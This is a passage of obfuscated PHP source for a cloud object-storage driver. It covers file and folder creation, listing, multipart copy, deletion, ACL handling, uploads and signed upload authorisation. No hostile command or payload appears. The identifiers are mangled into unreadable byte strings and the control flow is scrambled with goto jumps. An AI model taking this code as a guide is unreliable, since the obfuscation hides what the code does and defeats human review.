$B½Øâ°¨è =& $_SERVER[í…¶]; $c”ºİ¡¦•¥ = $this->getBucketCors(); if (!$c”ºİ¡¦•¥ || !is_array($c”ºİ¡¦•¥)) { return !1; } goto a¾èÏ‚å¾Ï; a¾èÏ‚å¾Ï: if ($c”ºİ¡¦•¥[$B½Øâ°¨è[175]] != $B½Øâ°¨è[176] || $c”ºİ¡¦•¥[$B½Øâ°¨è[177]] != $B½Øâ°¨è[176]) { return !1; } $bÃªé½‰…Ğ = array_map($B½Øâ°¨è[178], $c”ºİ¡¦•¥[$B½Øâ°¨è[179]]); if (!is_array($bÃªé½‰…Ğ)) { $bÃªé½‰…Ğ = array(); } goto f¯¹¨°İù×; BñÇÑ“ó: } public function mkfile($aƒïˆ¥Œ‚, $D…‚†èİ¿Ì = '', $CïæÉóàÉ = REPEAT_RENAME) { $fŸ¶ù´ÆÏÙ = $this->setContent($aƒïˆ¥Œ‚, $D…‚†èİ¿Ì); if ($fŸ¶ù´ÆÏÙ !== !1) { return $this->getPathOuter($aƒïˆ¥Œ‚); } return !1; } public function mkdir($fÃ¡…±›ƒŸ, $FÏÄ¹‡ï‡ = REPEAT_SKIP) { if ($this->_isFolder($fÃ¡…±›ƒŸ)) { return $this->getPathOuter($fÃ¡…±›ƒŸ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($fÃ¡…±›ƒŸ)); } catch (OSS\Core\OssException $ašñ¢í„ï„) { return !1; } return $this->getPathOuter($fÃ¡…±›ƒŸ); } private function fileList($CšŞ´ÙÉÖÄ, $f»‰ñ¸¥í· = '', $BÀÎ½Öó¾Í = 0) { goto DÆ®ºˆ•Ò¥; DÆ®ºˆ•Ò¥: $c¨ÙœŠ =& $_SERVER[í…¶]; $CšŞ´ÙÉÖÄ = trim($CšŞ´ÙÉÖÄ, $c¨ÙœŠ[8]); $EàŸÀÃæ¶ = empty($CšŞ´ÙÉÖÄ) ? $c¨ÙœŠ[33] : $CšŞ´ÙÉÖÄ . $c¨ÙœŠ[8]; goto eÑîƒéÒ»—; eÑîƒéÒ»—: $f¨ä¬‹‘êÊ = $c¨ÙœŠ[33]; $A˜›ƒà¤ = 1000; $AâŒƒŒ™˜• = $E¿¶Æ¶¾§¯ = array(); goto FªÈÌ¶öÓ; FªÈÌ¶öÓ: while (!0) { $Dê†äÎÃº‹ = array($c¨ÙœŠ[1179] => $f»‰ñ¸¥í·, $c¨ÙœŠ[186] => $EàŸÀÃæ¶, $c¨ÙœŠ[1180] => $A˜›ƒà¤, $c¨ÙœŠ[1181] => $f¨ä¬‹‘êÊ); try { $c‰À´ˆ†æé = $this->client->listObjects($this->bucket, $Dê†äÎÃº‹); } catch (OSS\Core\OssException $a¬Ô‹¦ˆøù) { break; } $f¨ä¬‹‘êÊ = $c‰À´ˆ†æé->getNextMarker(); $bĞ‡×†©«‚ = $c‰À´ˆ†æé->getObjectList(); $bÚ¢­¦Ä®â = $c‰À´ˆ†æé->getPrefixList(); foreach ($bĞ‡×†©«‚ as $c‡¦½¥Úö) { if ($c‡¦½¥Úö->getKey() == $EàŸÀÃæ¶) { continue; } $D˜¡ÄÚ‘ÖØ = $c‡¦½¥Úö->getKey(); if ($BÀÎ½Öó¾Í) { $D˜¡ÄÚ‘ÖØ = array($c¨ÙœŠ[28] => $D˜¡ÄÚ‘ÖØ, $c¨ÙœŠ[77] => $c‡¦½¥Úö->getSize(), $c¨ÙœŠ[190] => strtotime($c‡¦½¥Úö->getLastModified())); } $E¿¶Æ¶¾§¯[] = $D˜¡ÄÚ‘ÖØ; } foreach ($bÚ¢­¦Ä®â as $b¹†ÄÖäöñ) { $AâŒƒŒ™˜•[] = $b¹†ÄÖäöñ->getPrefix(); } if ($f¨ä¬‹‘êÊ === $c¨ÙœŠ[33]) { break; } } return array($c¨ÙœŠ[74] => $AâŒƒŒ™˜•, $c¨ÙœŠ[73] => $E¿¶Æ¶¾§¯); goto CŒÙò¹Óèƒ; CŒÙò¹Óèƒ: } public function copyFile($B¢µä¦ô, $fÀòÓÓÁŠñ) { $bŞ¾ô·¨³ = $this->size($B¢µä¦ô); if ($bŞ¾ô·¨³ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $B¢µä¦ô, $this->bucket, $this->pathEncode($fÀòÓÓÁŠñ)); } catch (OSS\Core\OssException $Fš¤Ë¢İí) { return !1; } return $this->getPathOuter($fÀòÓÓÁŠñ); } $a¦ˆòÄè¥Â = $this->multiCopyObject($B¢µä¦ô, $fÀòÓÓÁŠñ, $bŞ¾ô·¨³); return $a¦ˆòÄè¥Â ? $this->getPathOuter($fÀòÓÓÁŠñ) : !1; } private function multiCopyObject($Eëì–ÑİÓ, $B‰‰Ê‹Ãò‡, $E‰Ñ¿Øº£Ì) { $eßğÑ‹ÆÛ¸ =& $_SERVER[í…¶]; try { goto B÷‘‰µÏÓ; a†ö¢¨á: $CºœØÂß§Š = array(); foreach ($b¦·¤©Ê¦ as $CÒÔ‰‘Ú°í => $FâÈäˆîÆº) { $CºœØÂß§Š[] = array($eßğÑ‹ÆÛ¸[1186] => $CÒÔ‰‘Ú°í + 1, $eßğÑ‹ÆÛ¸[1187] => $FâÈäˆîÆº); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($B‰‰Ê‹Ãò‡), $B‹ªø¿é¾×, $CºœØÂß§Š); goto BĞó¢åæ®; B÷‘‰µÏÓ: $aì¦¹Ó‡„Œ = array(); if ($CŸİÁ¸ºÜ = $this->hashMd5($Eëì–ÑİÓ)) { $aì¦¹Ó‡„Œ = array(OSS\OssClient::OSS_HEADERS => array($eßğÑ‹ÆÛ¸[1182] => $CŸİÁ¸ºÜ)); } $B‹ªø¿é¾× = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($B‰‰Ê‹Ãò‡), $aì¦¹Ó‡„Œ); goto BÎŒ‡—‰; EÉÚÈ¦å¬Ì: $FÏš’Æ¡® = 1024 * 1024 * 10; $Fõ‰®Çê£ = $this->client->generateMultiuploadParts($E‰Ñ¿Øº£Ì, $FÏš’Æ¡®); foreach ($Fõ‰®Çê£ as $CÒÔ‰‘Ú°í => $CìÑ‰·Á˜Ç) { $dğ¨‹ÂŠ©Ø = $eôğ‰š²”Ú + (int) $CìÑ‰·Á˜Ç[$eßğÑ‹ÆÛ¸[1183]]; $DÁÚççäîé = (int) $CìÑ‰·Á˜Ç[$eßğÑ‹ÆÛ¸[325]] + $dğ¨‹ÂŠ©Ø - 1; $A»ä²îÜÛ = array($eßğÑ‹ÆÛ¸[1184] => $dğ¨‹ÂŠ©Ø, $eßğÑ‹ÆÛ¸[1185] => $DÁÚççäîé); $b¦·¤©Ê¦[] = $this->client->uploadPartCopy($this->bucket, $Eëì–ÑİÓ, $this->bucket, $this->pathEncode($B‰‰Ê‹Ãò‡), $a¬ÀÖõÉÏÄ, $B‹ªø¿é¾×, $A»ä²îÜÛ); $a¬ÀÖõÉÏÄ = $a¬ÀÖõÉÏÄ + 1; } goto a†ö¢¨á; BÎŒ‡—‰: $a¬ÀÖõÉÏÄ = 1; $eôğ‰š²”Ú = 0; $b¦·¤©Ê¦ = array(); goto EÉÚÈ¦å¬Ì; BĞó¢åæ®: } catch (OSS\Core\OssException $BÉ‚¾³—ÜÚ) { return !1; } return !0; } public function moveFile($F°ç‘­»ã, $fÄÂ•¶¾ğ‘) { if ($this->copyFile($F°ç‘­»ã, $fÄÂ•¶¾ğ‘)) { $this->remove($F°ç‘­»ã); return $this->getPathOuter($fÄÂ•¶¾ğ‘); } return !1; } public function delFile($dó¤¦Œáôè) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($dó¤¦Œáôè)); } catch (OSS\Core\OssException $cêÂÜÂšÈ‡) { return !1; } return !0; } public function delFolder($cìœİæÂÅ) { $F¨«„ˆ¡¬‘ =& $_SERVER[í…¶]; $B—É”•Ô¨ = $this->fileList($cìœİæÂÅ); if (!empty($cìœİæÂÅ) && !in_array(trim($cìœİæÂÅ, $F¨«„ˆ¡¬‘[8]) . $F¨«„ˆ¡¬‘[8], $B—É”•Ô¨[$F¨«„ˆ¡¬‘[73]])) { $B—É”•Ô¨[$F¨«„ˆ¡¬‘[73]][] = trim($cìœİæÂÅ, $F¨«„ˆ¡¬‘[8]) . $F¨«„ˆ¡¬‘[8]; } foreach (array_chunk($B—É”•Ô¨[$F¨«„ˆ¡¬‘[73]], 1000) as $eÈ¾ÚëÎ¾) { try { $this->client->deleteObjects($this->bucket, $eÈ¾ÚëÎ¾); } catch (OSS\Core\OssException $BÚŠ¥…ˆ´) { continue; } } return !0; } public function rename($E¿ğÍÄœøÏ, $FÂñ†šºø) { return $this->renameObject($E¿ğÍÄœøÏ, $FÂñ†šºø); } private function fileInfo($a‡¯›ê–‘—, $Eà‹¨Ö¬¡³ = array()) { goto F‡‚Ÿ­ç¿; AÜÒ¦„èŞ: if (isset($Eà‹¨Ö¬¡³[$E“Ô…ºœœË[77]])) { $F‰×Ûˆç¥[$E“Ô…ºœœË[77]] = $Eà‹¨Ö¬¡³[$E“Ô…ºœœË[77]]; } if (isset($Eà‹¨Ö¬¡³[$E“Ô…ºœœË[107]])) { $F‰×Ûˆç¥[$E“Ô…ºœœË[107]] = $Eà‹¨Ö¬¡³[$E“Ô…ºœœË[107]]; } if (isset($Eà‹¨Ö¬¡³[$E“Ô…ºœœË[190]]) && !trim($F‰×Ûˆç¥[$E“Ô…ºœœË[107]])) { $F‰×Ûˆç¥[$E“Ô…ºœœË[107]] = $Eà‹¨Ö¬¡³[$E“Ô…ºœœË[190]]; } goto eùŸá£‹»ì; eùŸá£‹»ì: return $F‰×Ûˆç¥; goto B±°Ù‚£¤¶; F‡‚Ÿ­ç¿: $E“Ô…ºœœË =& $_SERVER[í…¶]; $F‰×Ûˆç¥ = array($E“Ô…ºœœË[28] => $this->pathThis($a‡¯›ê–‘—), $E“Ô…ºœœË[75] => $this->getPathOuter($a‡¯›ê–‘—), $E“Ô…ºœœË[29] => $E“Ô…ºœœË[167], $E“Ô…ºœœË[187] => 0, $E“Ô…ºœœË[107] => 0, $E“Ô…ºœœË[77] => 0, $E“Ô…ºœœË[160] => $this->ext($a‡¯›ê–‘—), $E“Ô…ºœœË[188] => !0, $E“Ô…ºœœË[189] => !0); if (empty($Eà‹¨Ö¬¡³)) { $Dˆßò—˜§Â = $this->objectMeta($a‡¯›ê–‘—); if (!$Dˆßò—˜§Â) { return $F‰×Ûˆç¥; } $Eà‹¨Ö¬¡³ = array($E“Ô…ºœœË[107] => strtotime($Dˆßò—˜§Â[$E“Ô…ºœœË[1188]]), $E“Ô…ºœœË[77] => $Dˆßò—˜§Â[$E“Ô…ºœœË[1189]] + 0); } goto AÜÒ¦„èŞ; B±°Ù‚£¤¶: } private function folderInfo($bÍåé„Õ†ƒ, $FØƒğñˆŞ˜ = array()) { $eˆ¼øÕİ‡ =& $_SERVER[í…¶]; $EÙ“ŒÚ‡¹ç = array($eˆ¼øÕİ‡[28] => $this->pathThis($bÍåé„Õ†ƒ), $eˆ¼øÕİ‡[75] => $this->getPathOuter($eˆ¼øÕİ‡[8] . $bÍåé„Õ†ƒ), $eˆ¼øÕİ‡[29] => $eˆ¼øÕİ‡[76], $eˆ¼øÕİ‡[187] => 0, $eˆ¼øÕİ‡[107] => 0, $eˆ¼øÕİ‡[188] => !0, $eˆ¼øÕİ‡[189] => !0); if (empty($FØƒğñˆŞ˜)) { $bÍåé„Õ†ƒ = rtrim($bÍåé„Õ†ƒ, $eˆ¼øÕİ‡[8]) . $eˆ¼øÕİ‡[8]; $aĞ‹ÉËøšì = $this->objectMeta($bÍåé„Õ†ƒ); if (!$aĞ‹ÉËøšì) { return $EÙ“ŒÚ‡¹ç; } $FØƒğñˆŞ˜ = array($eˆ¼øÕİ‡[187] => $aĞ‹ÉËøšì[$eˆ¼øÕİ‡[1190]][$eˆ¼øÕİ‡[1191]], $eˆ¼øÕİ‡[107] => strtotime($aĞ‹ÉËøšì[$eˆ¼øÕİ‡[1188]])); } if (isset($FØƒğñˆŞ˜[$eˆ¼øÕİ‡[107]])) { $EÙ“ŒÚ‡¹ç[$eˆ¼øÕİ‡[107]] = $FØƒğñˆŞ˜[$eˆ¼øÕİ‡[107]]; } if (isset($FØƒğñˆŞ˜[$eˆ¼øÕİ‡[187]])) { $EÙ“ŒÚ‡¹ç[$eˆ¼øÕİ‡[187]] = $FØƒğñˆŞ˜[$eˆ¼øÕİ‡[187]]; } return $EÙ“ŒÚ‡¹ç; } public function listPath($fçô­¢èªÙ, $fëÔÜ±¶Ÿ” = false) { $E´•«ƒÈÆ =& $_SERVER[í…¶]; $B¹å¯Áìœ  = $this->fileList($fçô­¢èªÙ, $E´•«ƒÈÆ[8], !0); foreach ($B¹å¯Áìœ [$E´•«ƒÈÆ[74]] as $Fğ³æõöÊ· => $fÜç±íµÄ) { $B¹å¯Áìœ [$E´•«ƒÈÆ[74]][$Fğ³æõöÊ·] = $this->folderInfo($fÜç±íµÄ, $fÜç±íµÄ); } foreach ($B¹å¯Áìœ [$E´•«ƒÈÆ[73]] as $Fğ³æõöÊ· => $fÜç±íµÄ) { $B¹å¯Áìœ [$E´•«ƒÈÆ[73]][$Fğ³æõöÊ·] = $this->fileInfo($fÜç±íµÄ[$E´•«ƒÈÆ[28]], $fÜç±íµÄ); } return $B¹å¯Áìœ ; } public function has($Aˆ’ÂÉêÅ…, $AèÄ®ÔÚÑ‚ = false, $AÔ—³…‡”Á = true) { goto e–ÃÎ†; fÜœÚ‡†™¹: $fŒõ†–Ä‘õ = 0; while (!0) { $c¯¦í»˜Ò¨ = array($fŸ°Ğ–ø±[1179] => $fŸ°Ğ–ø±[8], $fŸ°Ğ–ø±[186] => $C‘Æ–ØÆó, $fŸ°Ğ–ø±[1180] => $a°ôáÔ¤Ã„, $fŸ°Ğ–ø±[1181] => $dåçîî); try { $BõóÀÚÈ = $this->client->listObjects($this->bucket, $c¯¦í»˜Ò¨); } catch (OSS\Core\OssException $b¶ğñå¸Û) { break; } $dåçîî = $BõóÀÚÈ->getNextMarker(); $AÚ‡•¢òÖ£ = $BõóÀÚÈ->getObjectList(); $f”¬®Òºˆ„ = $BõóÀÚÈ->getPrefixList(); if ($AèÄ®ÔÚÑ‚) { if (count($AÚ‡•¢òÖ£) > 1 || count($AÚ‡•¢òÖ£) == 1 && $AÚ‡•¢òÖ£[0]->getKey() != $C‘Æ–ØÆó) { $DàØùÂ‹Ï÷ += count($AÚ‡•¢òÖ£) - 1; } if (!empty($f”¬®Òºˆ„)) { $fŒõ†–Ä‘õ += count($f”¬®Òºˆ„); } if ($dåçîî === $fŸ°Ğ–ø±[33]) { break; } continue; } if ($AÔ—³…‡”Á) { if (!empty($AÚ‡•¢òÖ£)) { if (count($AÚ‡•¢òÖ£) > 1 || $AÚ‡•¢òÖ£[0]->getKey() != $C‘Æ–ØÆó) { return !0; } } } else { if (!empty($f”¬®Òºˆ„)) { return !0; } } if ($dåçîî === $fŸ°Ğ–ø±[33]) { break; } } if ($AèÄ®ÔÚÑ‚) { return array($fŸ°Ğ–ø±[191] => $DàØùÂ‹Ï÷, $fŸ°Ğ–ø±[192] => $fŒõ†–Ä‘õ); } goto D–“ùÓ; e–ÃÎ†: $fŸ°Ğ–ø± =& $_SERVER[í…¶]; $Aˆ’ÂÉêÅ… = trim($Aˆ’ÂÉêÅ…, $fŸ°Ğ–ø±[8]); $C‘Æ–ØÆó = empty($Aˆ’ÂÉêÅ…) ? $fŸ°Ğ–ø±[33] : $Aˆ’ÂÉêÅ… . $fŸ°Ğ–ø±[8]; goto A©‚Ä©²í÷; A©‚Ä©²í÷: $dåçîî = $fŸ°Ğ–ø±[33]; $a°ôáÔ¤Ã„ = 500; $DàØùÂ‹Ï÷ = 0; goto fÜœÚ‡†™¹; D–“ùÓ: return !1; goto fË‡ĞÔ¨‘Œ; fË‡ĞÔ¨‘Œ: } public function listAll($AœêøÈÔĞ) { $BÍ™ÜÃšÄ =& $_SERVER[í…¶]; $D‘ïÏôÕ”ã = $this->fileList($AœêøÈÔĞ, $BÍ™ÜÃšÄ[33], !0); $d¿‡äÊ’ = array(); foreach ($D‘ïÏôÕ”ã[$BÍ™ÜÃšÄ[73]] as $b«Ÿ·ìâ) { $d¿‡äÊ’[$b«Ÿ·ìâ[$BÍ™ÜÃšÄ[28]]] = $b«Ÿ·ìâ[$BÍ™ÜÃšÄ[77]]; } return $this->listAllFiles($AœêøÈÔĞ, array_keys($d¿‡äÊ’), $d¿‡äÊ’); } public function canRead($a˜‹Š†ÅÖ) { $Fùâ°âÃã =& $_SERVER[í…¶]; $a‡›ÇĞŒ÷Ì = $this->pathAcl($a˜‹Š†ÅÖ); return $a‡›ÇĞŒ÷Ì == $Fùâ°âÃã[1192] || $a‡›ÇĞŒ÷Ì == $Fùâ°âÃã[500] ? !0 : !1; } public function canWrite($eõ™®Ì¸¤) { $FÔ³…œÁÜÔ = $this->pathAcl($eõ™®Ì¸¤); return $FÔ³…œÁÜÔ == $_SERVER[í…¶][500] ? !0 : !1; } public function pathAcl($e•Üõ°¼‰) { goto fµâ³¦ç„ñ; c”Ù‡Ü¶çÑ: $bà£¬ˆ³†ò = $bÍ¿”Š‡œÇ == $A«ˆœ°ã’[34] ? $this->bucketAcl : $bÍ¿”Š‡œÇ; if ($bà£¬ˆ³†ò == $A«ˆœ°ã’[1193]) { return $A«ˆœ°ã’[1192]; } if ($bà£¬ˆ³†ò == $A«ˆœ°ã’[1194]) { return $A«ˆœ°ã’[500]; } goto AøØ˜ƒÅƒÕ; fµâ³¦ç„ñ: $A«ˆœ°ã’ =& $_SERVER[í…¶]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $bÍ¿”Š‡œÇ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($e•Üõ°¼‰)); } catch (OSS\Core\OssException $aÓô¬¨Æã) { return !1; } goto c”Ù‡Ü¶çÑ; AøØ˜ƒÅƒÕ: return $bà£¬ˆ³†ò; goto b¬ä‡•›„è; b¬ä‡•›„è: } private function chmodPath($bÒ¹é˜¾, $f‹‡Æô½åğ = '') { $Dñ´ŞÓ± =& $_SERVER[í…¶]; $déºñ®¬Åˆ = empty($f‹‡Æô½åğ) ? $Dñ´ŞÓ±[1194] : $f‹‡Æô½åğ; $AùÜ¦œî»Õ = array($Dñ´ŞÓ±[34], $Dñ´ŞÓ±[185], $Dñ´ŞÓ±[1193], $Dñ´ŞÓ±[1194]); if (!in_array($déºñ®¬Åˆ, $AùÜ¦œî»Õ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($bÒ¹é˜¾), $déºñ®¬Åˆ); } catch (OSS\Core\OssException $fé·¦õË‘ñ) { return !1; } return !0; } public function getContent($E´º˜•÷äé) { return $this->fileSubstr($E´º˜•÷äé, -1); } public function setContent($døš”¨¼÷‡, $FØƒ—ÎµÕŞ = '') { $D…‡‹ï£Š =& $_SERVER[í…¶]; try { $b¸Ê‹Š‡‰¿ = $this->trafficLimit($D…‡‹ï£Š[1195]); $Eİ¤–¿´ÇÍ = $this->client->putObject($this->bucket, $this->pathEncode($døš”¨¼÷‡), $FØƒ—ÎµÕŞ, $b¸Ê‹Š‡‰¿); } catch (OSS\Core\OssException $bØ¬©£‹¬á) { return !1; } $aî³ÀĞÖ‹š = array($D…‡‹ï£Š[1182] => trim($Eİ¤–¿´ÇÍ[$D…‡‹ï£Š[1196]], $D…‡‹ï£Š[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($døš”¨¼÷‡))); $this->updateObjMeta($døš”¨¼÷‡, $aî³ÀĞÖ‹š); return isset($Eİ¤–¿´ÇÍ[$D…‡‹ï£Š[1197]][$D…‡‹ï£Š[1144]]) ? (int) $Eİ¤–¿´ÇÍ[$D…‡‹ï£Š[1197]][$D…‡‹ï£Š[1144]] : strlen($Eİ¤–¿´ÇÍ); } private function updateObjMeta($f‡ÏÔâ…¨ö, $C¯¨Ûå˜óË) { $f‡ÏÔâ…¨ö = $this->pathEncode($f‡ÏÔâ…¨ö); try { $CæŸùä°Ûé = array(OSS\OssClient::OSS_HEADERS => $C¯¨Ûå˜óË); $this->client->copyObject($this->bucket, $f‡ÏÔâ…¨ö, $this->bucket, $f‡ÏÔâ…¨ö, $CæŸùä°Ûé); } catch (OSS\Core\OssException $c¼ìœßñ°İ) { return !1; } return !0; } public function upload($fÛ‹±¨¾, $B³–ñ®¿Æß, $C ½´ù¨Œñ = false, $fñ‘µ˜Âáè = REPEAT_REPLACE) { $bÜ»Ä×í‰¿ =& $_SERVER[í…¶]; $DÏ›Šé²Ïó = trim($fÛ‹±¨¾, $bÜ»Ä×í‰¿[8]); $aòÀÇÎÊ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($bÜ»Ä×í‰¿[1182] => @md5_file($B³–ñ®¿Æß)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($fÛ‹±¨¾))); $aòÀÇÎÊ = $this->trafficLimit($bÜ»Ä×í‰¿[1195], $aòÀÇÎÊ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($DÏ›Šé²Ïó), $B³–ñ®¿Æß, $aòÀÇÎÊ); } catch (OSS\Core\OssException $Aæ°Ä¼·ËÀ) { return !1; } return $this->getPathOuter($fÛ‹±¨¾); } public function getHost() { $E¯½¦×¸÷´ =& $_SERVER[í…¶]; $C½ì»×¹ = explode($E¯½¦×¸÷´[171], parent::getHost()); return $C½ì»×¹[0] . $E¯½¦×¸÷´[171] . $this->bucket . $E¯½¦×¸÷´[91] . $C½ì»×¹[1]; } public function uploadFormData($Eæˆİëòšô, $dÒÔÀµá¢ = 3600) { goto e¥«ÚßÊ·È; aˆÆ‰©‘°: $cÑø—·ÔŞË = strpos($dù‘ºÄœµ—, $eÜå“¸¹³¾[284]); $dù‘ºÄœµ— = substr($dù‘ºÄœµ—, 0, $cÑø—·ÔŞË) . $eÜå“¸¹³¾[1199]; $EİŒ×™‚ëÀ = 1048576000 * 5; goto bĞ…‡Øª¾°; bĞ…‡Øª¾°: $dºñÇƒ‘È¹ = $this->pathFather($Eæˆİëòšô); $Eì›˜Û˜ó = array($eÜå“¸¹³¾[1100] => $dù‘ºÄœµ—, $eÜå“¸¹³¾[1101] => array(array($eÜå“¸¹³¾[1200], 0, $EİŒ×™‚ëÀ), array($eÜå“¸¹³¾[1104], $eÜå“¸¹³¾[1105], $dºñÇƒ‘È¹))); $f§ À±Ş´ = base64_encode(json_encode($Eì›˜Û˜ó)); goto cŠ‡§˜ˆº˜; D†“æ‰Ìõ÷: return $dº³×¿“…ä; goto FÆœùË‡¦; cŠ‡§˜ˆº˜: $Eš§·•‡ŒÔ = base64_encode(hash_hmac($eÜå“¸¹³¾[218], $f§ À±Ş´, $this->secret, !0)); $dº³×¿“…ä = array($eÜå“¸¹³¾[1110] => $f§ À±Ş´, $eÜå“¸¹³¾[1201] => $this->accessKey, $eÜå“¸¹³¾[1106] => $eÜå“¸¹³¾[1098], $eÜå“¸¹³¾[1202] => $Eš§·•‡ŒÔ, $eÜå“¸¹³¾[169] => $A¯½ßÙ³•); $dº³×¿“…ä = $this->trafficLimit($eÜå“¸¹³¾[1195], $dº³×¿“…ä); goto D†“æ‰Ìõ÷; e¥«ÚßÊ·È: $eÜå“¸¹³¾ =& $_SERVER[í…¶]; if (!($A¯½ßÙ³• = $this->getHost())) { return !1; } $båµùî‰ = $dÒÔÀµá¢; goto e²†¦½Â¤; e²†¦½Â¤: $dù‰´¼£«é = date($eÜå“¸¹³¾[1198], time() + $båµùî‰); $d÷óÖÚ…ù = new DateTime($dù‰´¼£«é); $dù‘ºÄœµ— = $d÷óÖÚ…ù->format(DateTime::ISO8601); goto aˆÆ‰©‘°; FÆœùË‡¦: } public function multiUploadFormData($a¶ÖªŠ‚¨, $BŞÅ¾Åë¨â = 3600) { $EĞÀ¦¬å± =& $_SERVER[í…¶]; if (!($ağ“ÆÑ¤À• = $this->getHost())) { return !1; } $bĞ½»·À© = $this->trafficLimit($EĞÀ¦¬å±[1195]); $BŞ„¾»× = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($a¶ÖªŠ‚¨), $bĞ½»·À©); return array($EĞÀ¦¬å±[209] => $BŞ„¾»×, $EĞÀ¦¬å±[169] => $ağ“ÆÑ¤À• . $EĞÀ¦¬å±[8] . $this->pathEncode($a¶ÖªŠ‚¨), $EĞÀ¦¬å±[210] => gmdate($EĞÀ¦¬å±[1203]), $EĞÀ¦¬å±[89] => $a¶ÖªŠ‚¨); } public function multiUploadAuthData($D÷¦Óè›¥, $d­¿–¡ä®Ä = array()) { goto a™–•ËÅ…; b‰ÔËÅŒˆĞ: if (!empty($d­¿–¡ä®Ä[$bŞÓÃ§İê[1205]])) { $F¿“¤‘àò† = array_merge(array($dÔíê”‰”Ş[4]), $d­¿–¡ä®Ä[$bŞÓÃ§İê[1205]]); sort($F¿“¤‘àò†); $dÔíê”‰”Ş[4] = implode($bŞÓÃ§İê[217], $F¿“¤‘àò†); } $BĞ•¨­°í = implode($bŞÓÃ§İê[217], $dÔíê”‰”Ş); $fÉï‡ÖÇ ‡ = base64_encode(hash_hmac($bŞÓÃ§İê[218], $BĞ•¨­°í, $this->secret, !0)); goto c°µ§±Œ½; a™–•ËÅ…: $bŞÓÃ§İê =& $_SERVER[í…¶]; $D¡Ï”¤“® = isset($d­¿–¡ä®Ä[$bŞÓÃ§İê[210]]) ? $d­¿–¡ä®Ä[$bŞÓÃ§İê[210]] : gmdate($bŞÓÃ§İê[1203]); $DŞ®ëô„ÑÌ = isset($d­¿–¡ä®Ä[$bŞÓÃ§İê[160]]) ? $d­¿–¡ä®Ä[$bŞÓÃ§İê[160]] : $bŞÓÃ§İê[33]; goto b¨Ëµ„Òœ; c°µ§±Œ½: $dåÁ…ŞœÓ = $bŞÓÃ§İê[1206] . $this->accessKey . $bŞÓÃ§İê[4] . $fÉï‡ÖÇ ‡; if (strpos($DŞ®ëô„ÑÌ, $bŞÓÃ§İê[213]) === 0) { $dåÁ…ŞœÓ = array($bŞÓÃ§İê[220] => $dåÁ…ŞœÓ, $bŞÓÃ§İê[210] => $D¡Ï”¤“®); if ($ašàáÍŠ‚) { $dåÁ…ŞœÓ = array_merge($dåÁ…ŞœÓ, $ašàáÍŠ‚); } } return $dåÁ…ŞœÓ; goto eÀ ‚¨ƒÍÎ; b¨Ëµ„Òœ: $aƒóå®ƒÊÏ = $D÷¦Óè›¥; if (isset($d­¿–¡ä®Ä[$bŞÓÃ§İê[89]])) { $aƒóå®ƒÊÏ = $d­¿–¡ä®Ä[$bŞÓÃ§İê[89]]; unset($d­¿–¡ä®Ä[$bŞÓÃ§İê[89]]); } if (isset($d­¿–¡ä®Ä[$bŞÓÃ§İê[211]])) { $d­¿–¡ä®Ä[$bŞÓÃ§İê[210]] = $D¡Ï”¤“®; return $this->listUploadParts($aƒóå®ƒÊÏ, $d­¿–¡ä®Ä); } goto DÇ°†—¬ñ“; DÇ°†—¬ñ“: $dÔíê”‰”Ş = array($bŞÓÃ§İê[212], $bŞÓÃ§İê[33], $bŞÓÃ§İê[116], $D¡Ï”¤“®, "\170\x2d\x6f\163\163\x2d\144\141\x74\145\72{$D¡Ï”¤“®}", $bŞÓÃ§İê[8] . $this->bucket . $bŞÓÃ§İê[8] . $aƒóå®ƒÊÏ . $DŞ®ëô„ÑÌ); if (strpos($DŞ®ëô„ÑÌ, $bŞÓÃ§İê[213]) === 0) { $dÔíê”‰”Ş[0] = $bŞÓÃ§İê[214]; if ($ašàáÍŠ‚ = $this->trafficLimit($bŞÓÃ§İê[1195])) { $aƒóå®ƒÊÏ = $bŞÓÃ§İê[1204]; array_splice($dÔíê”‰”Ş, 5, 0, $aƒóå®ƒÊÏ . $bŞÓÃ§İê[4] . $ašàáÍŠ‚[$aƒóå®ƒÊÏ]); } } if (isset($d­¿–¡ä®Ä[$bŞÓÃ§İê[215]]) && $d­¿–¡ä®Ä[$bŞÓÃ§İê[215]] == $bŞÓÃ§İê[216]) { $dÔíê”‰”Ş[0] = $bŞÓÃ§İê[216]; } goto b‰ÔËÅŒˆĞ; eÀ ‚¨ƒÍÎ: } public function listUploadParts($cœ„ê¼ç, $eğ¦ÔˆÛ¡Ø) { goto C©ºËÄ©; CÙ²ö¶½¿: $FŞÚÎİèŠ¢ = $DíÂ×”ëå¥->getListPart(); $Bè¨Ëµ’±ó = array(); foreach ($FŞÚÎİèŠ¢ as $f‘¸‚ªÒÙí) { $Bè¨Ëµ’±ó[] = array($aØÎôÙòàÀ[1186] => $f‘¸‚ªÒÙí->getPartNumber(), $aØÎôÙòàÀ[1187] => trim($f‘¸‚ªÒÙí->getETag(), $aØÎôÙòàÀ[113])); } goto D›‚·Áˆ‘¨; C©ºËÄ©: $aØÎôÙòàÀ =& $_SERVER[í…¶]; $B¹À²ÏÖÕİ = parse_url_query($eğ¦ÔˆÛ¡Ø[$aØÎôÙòàÀ[160]]); $DíÂ×”ëå¥ = $this->client->listParts($this->bucket, $this->pathEncode($cœ„ê¼ç), $B¹À²ÏÖÕİ[$aØÎôÙòàÀ[209]]); goto CÙ²ö¶½¿; D›‚·Áˆ‘¨: unset($eğ¦ÔˆÛ¡Ø[$aØÎôÙòàÀ[211]], $eğ¦ÔˆÛ¡Ø[$aØÎôÙòàÀ[215]]); $aĞ”÷“ä¹Ô = $this->multiUploadAuthData($cœ„ê¼ç, $eğ¦ÔˆÛ¡Ø); if (empty($aĞ”÷“ä¹Ô)) { return !1; } goto a‹½­ÌÊº…; a‹½­ÌÊº…: return 